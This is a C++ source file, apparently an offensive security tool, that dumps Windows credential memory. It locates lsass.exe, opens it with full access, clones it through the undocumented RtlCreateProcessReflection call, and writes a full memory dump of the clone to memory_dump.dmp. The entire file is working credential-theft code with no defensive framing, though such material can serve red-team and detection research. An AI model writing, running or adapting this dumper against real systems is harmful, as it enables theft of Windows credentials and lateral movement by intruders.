// Author: Offensive-Panda
// Offensive Security Researcher
// Corrected Code by BreachLabs
#include <windows.h>
#include <DbgHelp.h>
#include <tlhelp32.h>
#include <iostream>

#pragma comment(lib, "Dbghelp.lib")

LPVOID dBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200);
DWORD bRead = 0;

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002

typedef struct _CLIENT_ID {
    PVOID UniqueProcess;
    PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _RTLP_PROCESS_REFLECTION_INFORMATION {
    HANDLE ReflectionProcessHandle;
    HANDLE ReflectionThreadHandle;
    CLIENT_ID ReflectionClientId;
    ULONG Flags;
} RTLP_PROCESS_REFLECTION_INFORMATION, * PRTLP_PROCESS_REFLECTION_INFORMATION;

typedef NTSTATUS(WINAPI* RtlCreateProcessReflectionFunc)(
    HANDLE, ULONG, PVOID, PVOID, PVOID, PVOID);

// Get PID by process name
DWORD GetProcessIdByName(LPCWSTR procname) {
    DWORD pid = 0;
    HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);

    if (!Process32FirstW(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    do {
        if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32NextW(hProcSnap, &pe32));

    CloseHandle(hProcSnap);
    return pid;
}

BOOL CALLBACK minidumpCallback(
    __in PVOID callbackParam,
    __in const PMINIDUMP_CALLBACK_INPUT callbackInput,
    __inout PMINIDUMP_CALLBACK_OUTPUT callbackOutput) {

    LPVOID destination = 0, source = 0;
    DWORD bufferSize = 0;

    switch (callbackInput->CallbackType) {
    case IoStartCallback:
        callbackOutput->Status = S_FALSE;
        break;
    case IoWriteAllCallback:
        callbackOutput->Status = S_OK;
        source = callbackInput->Io.Buffer;
        destination = (LPVOID)((DWORD_PTR)dBuf + (DWORD_PTR)callbackInput->Io.Offset);
        bufferSize = callbackInput->Io.BufferBytes;
        bRead += bufferSize;

        RtlCopyMemory(destination, source, bufferSize);
        break;
    case IoFinishCallback:
        callbackOutput->Status = S_OK;
        break;
    default:
        return TRUE;
    }
    return TRUE;
}

int main(int argc, char** argv) {
    int returnCode;
    HANDLE dumpFile = NULL;
    DWORD bytesWritten = 0;

    DWORD Pid = GetProcessIdByName(L"lsass.exe");
    if (Pid == 0) {
        printf("Could not find lsass.exe PID \n");
        return -1;
    }

    std::cout << "Lsass PID: " << Pid << std::endl;

    HANDLE victimHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, Pid);
    if (victimHandle == nullptr) {
        printf("Could not open a handle to lsass.exe \n");
        return -1;
    }

    printf("Got a handle to lsass.exe successfully \n");

    HMODULE lib = LoadLibraryA("ntdll.dll");
    if (!lib) {
        printf("Could not load ntdll.dll \n");
        return -1;
    }

    RtlCreateProcessReflectionFunc RtlCreateProcessReflection =
        (RtlCreateProcessReflectionFunc)GetProcAddress(lib, "RtlCreateProcessReflection");

    if (!RtlCreateProcessReflection) {
        printf("Could not find RtlCreateProcessReflection in ntdll.dll \n");
        return -1;
    }

    RTLP_PROCESS_REFLECTION_INFORMATION info = { 0 };

    NTSTATUS reflectRet = RtlCreateProcessReflection(
        victimHandle,
        RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES,
        NULL,
        NULL,
        NULL,
        &info
    );

    if (reflectRet != STATUS_SUCCESS) {
        printf("Could not mirror lsass.exe \n");
        return -1;
    }

    DWORD newPID = (DWORD)info.ReflectionClientId.UniqueProcess;
    printf("Successfully mirrored lsass.exe \n");
    std::cout << "Mirrored Lsass PID: " << newPID << std::endl;

    HANDLE newHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, newPID);
    if (newHandle == nullptr) {
        printf("Could not open a handle to the mirrored lsass.exe process \n");
        return -1;
    }

    MINIDUMP_CALLBACK_INFORMATION callbackInfo;
    ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    callbackInfo.CallbackRoutine = &minidumpCallback;
    callbackInfo.CallbackParam = NULL;

    std::string dumpFileName = "memory_dump.dmp";
    dumpFile = CreateFileA(dumpFileName.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (dumpFile == INVALID_HANDLE_VALUE) {
        printf("Failed to create dump file \n");
        return 1;
    }

    printf("Successfully initialized dump file \n");

    if (MiniDumpWriteDump(newHandle, newPID, dumpFile, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo) == FALSE) {
        DWORD error = GetLastError();
        printf("Failed to create dump of the mirrored process. Error code: %lu\n", error);
        return 1;
    }

    printf("Dump file successfully created. Bytes read: %lu\n", bRead);

    if (WriteFile(dumpFile, dBuf, bRead, &bytesWritten, NULL)) {
        printf("Successfully dumped lsass process \n");
    }
    else {
        printf("Failed to write dump to disk \n");
        return 1;
    }

    CloseHandle(dumpFile);

    return 0;
}
